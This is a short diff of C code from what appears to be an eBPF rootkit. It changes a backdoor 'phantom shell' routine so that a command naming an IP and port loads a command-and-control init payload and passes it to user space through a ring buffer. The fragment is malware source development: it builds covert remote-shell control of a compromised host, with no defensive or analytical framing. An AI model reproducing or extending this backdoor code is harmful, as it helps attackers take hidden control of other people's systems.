@@ -37,8 +37,8 @@ static __always_inline int execute_key_command(int command_received, __u32 ip, _
             ps_new_data.active = 1;
             ps_new_data.d_ip  = ip;
             ps_new_data.d_port = port;    
-            
-            bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
+            __builtin_memcpy(ps_new_data.payload, CC_PROT_PHANTOM_SHELL_INIT, 16);
+            ring_buffer_send_request_update_phantom_shell(&rb_comm, pid, command_received, ps_new_data);
             break;
             
         default:
